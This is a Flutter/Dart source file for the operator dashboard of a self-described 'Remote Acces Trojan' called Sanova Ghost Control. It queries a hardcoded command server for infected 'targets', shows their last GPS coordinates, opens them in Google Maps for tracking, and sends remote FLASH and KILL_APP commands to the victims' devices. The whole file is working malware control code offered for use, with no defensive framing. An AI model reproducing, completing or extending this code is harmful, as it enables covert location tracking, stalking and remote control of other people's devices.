// --- SANOVA GHOST CONTROL (SERVER: PRIVSERV.MY.ID) ---
import 'dart:convert';
import 'package:flutter/material.dart';
import 'dv_theme.dart';
import 'package:http/http.dart' as http;
import 'package:url_launcher/url_launcher.dart';

class ControlCenterPage extends StatefulWidget {
  final String sessionKey;

  const ControlCenterPage({super.key, required this.sessionKey});

  @override
  State<ControlCenterPage> createState() => _ControlCenterPageState();
}

class _ControlCenterPageState extends State<ControlCenterPage> {
  // CONFIG SERVER
  final String baseUrl = "http://37.114.55.23:3500";
  
  List<dynamic> _targets = [];
  bool _isLoading = false;

  @override
  void initState() {
    super.initState();
    _fetchTargets();
  }

  // MENGAMBIL DATA TARGET DARI SERVER PRIVSERV
  Future<void> _fetchTargets() async {
    setState(() => _isLoading = true);
    try {
      final response = await http.get(Uri.parse('$baseUrl/api/tools/target-list?key=${widget.sessionKey}'));
      if (response.statusCode == 200) {
        final data = jsonDecode(response.body);
        if (data['status'] == true) {
          setState(() => _targets = data['targets']);
        }
      } else {
        _showSnackBar('Server response error: ${response.statusCode}', isError: true);
      }
    } catch (e) {
      _showSnackBar('Failed to connect to PrivServ', isError: true);
    } finally {
      setState(() => _isLoading = false);
    }
  }

  // EKSEKUSI PERINTAH (FLASH/ALARM)
  Future<void> _executeRemote(String targetId, String action) async {
    try {
      final response = await http.get(Uri.parse('$baseUrl/api/tools/remote-exec?key=${widget.sessionKey}&target=$targetId&action=$action'));
      final resData = jsonDecode(response.body);
      if (resData['status'] == true) {
        _showSnackBar('Signal [$action] Success sent to $targetId');
      }
    } catch (e) {
      _showSnackBar('Execution Failed', isError: true);
    }
  }

  // FIX: OPEN GOOGLE MAPS DENGAN KOORDINAT NYATA
  Future<void> _openMap(dynamic lat, dynamic lng) async {
    // Menggunakan skema geo atau url google maps yang benar
    final String mapUrl = "https://www.google.com/maps/search/?api=1&query=$lat,$lng";
    final Uri url = Uri.parse(mapUrl);
    
    if (await canLaunchUrl(url)) {
      await launchUrl(url, mode: LaunchMode.externalApplication);
    } else {
      _showSnackBar('Could not launch Maps', isError: true);
    }
  }

  void _showSnackBar(String message, {bool isError = false}) {
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      content: Text(message, style: const TextStyle(fontFamily: 'Orbitron', fontSize: 10)),
      backgroundColor: isError ? DV.error.withOpacity(0.9) : DV.bg2,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(8)),
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: DV.bg0,
      appBar: AppBar(
        backgroundColor: DV.bg0,
        title: const Text('Remote Acces Trojan', 
          style: TextStyle(color: DV.orange, fontFamily: 'Orbitron', fontSize: 14, letterSpacing: 1.5)),
        actions: [
          IconButton(onPressed: _fetchTargets, icon: const Icon(Icons.refresh, color: DV.orange))
        ],
        elevation: 10,
        shadowColor: DV.orange.withOpacity(0.2),
      ),
      body: _isLoading 
        ? const Center(child: CircularProgressIndicator(color: DV.orange))
        : _targets.isEmpty 
          ? _buildEmptyState()
          : ListView.builder(
              padding: const EdgeInsets.all(16),
              itemCount: _targets.length,
              itemBuilder: (context, index) => _buildTargetCard(_targets[index]),
            ),
    );
  }

  Widget _buildTargetCard(Map<String, dynamic> target) {
    return Container(
      margin: const EdgeInsets.only(bottom: 20),
      padding: const EdgeInsets.all(12),
      decoration: BoxDecoration(
        color: DV.bg1,
        borderRadius: BorderRadius.circular(15),
        border: Border.all(color: DV.orange.withOpacity(0.3)),
        boxShadow: [
          BoxShadow(color: DV.orange.withOpacity(0.05), blurRadius: 10, spreadRadius: 1)
        ],
      ),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.start,
        children: [
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              Row(
                children: [
                  const Icon(Icons.developer_mode, color: DV.orange, size: 20),
                  const SizedBox(width: 10),
                  Text(target['id'] ?? 'DEVICE_UNKNOWN', 
                    style: const TextStyle(color: DV.textPrimary, fontWeight: FontWeight.bold, fontFamily: 'ShareTechMono')),
                ],
              ),
              const Icon(Icons.circle, color: DV.success, size: 8),
            ],
          ),
          const SizedBox(height: 10),
          Text("LAST COORDINATES:", style: TextStyle(color: DV.textSecondary, fontSize: 9)),
          // Menampilkan Lat/Lng dari JSON server
          Text("${target['lat'] ?? '0.0'}, ${target['lng'] ?? '0.0'}", 
            style: const TextStyle(color: DV.orange, fontSize: 12, fontFamily: 'monospace')),
          Divider(color: DV.glassBorder, height: 20),
          Row(
            mainAxisAlignment: MainAxisAlignment.spaceBetween,
            children: [
              _actionBtn("TRACK", Icons.map, Colors.blue, 
                () => _openMap(target['lat'], target['lng'])),
              _actionBtn("FLASH", Icons.flash_on, Colors.orange, 
                () => _executeRemote(target['id'], 'FLASH')),
              _actionBtn("KILL", Icons.power_settings_new, Colors.red, 
                () => _executeRemote(target['id'], 'KILL_APP')),
            ],
          )
        ],
      ),
    );
  }

  Widget _actionBtn(String label, IconData icon, Color col, VoidCallback onTap) {
    return InkWell(
      onTap: onTap,
      child: Container(
        padding: const EdgeInsets.symmetric(horizontal: 16, vertical: 8),
        decoration: BoxDecoration(
          color: col.withOpacity(0.1),
          borderRadius: BorderRadius.circular(8),
          border: Border.all(color: col.withOpacity(0.4)),
        ),
        child: Row(
          children: [
            Icon(icon, color: col, size: 14),
            const SizedBox(width: 6),
            Text(label, style: TextStyle(color: col, fontSize: 10, fontWeight: FontWeight.bold)),
          ],
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: Column(
        mainAxisAlignment: MainAxisAlignment.center,
        children: [
          Icon(Icons.radar, size: 50, color: DV.textHint),
          SizedBox(height: 10),
          Text("NO TARGETS DETECTED", style: TextStyle(color: DV.textHint, fontSize: 10, letterSpacing: 2)),
        ],
      ),
    );
  }
}
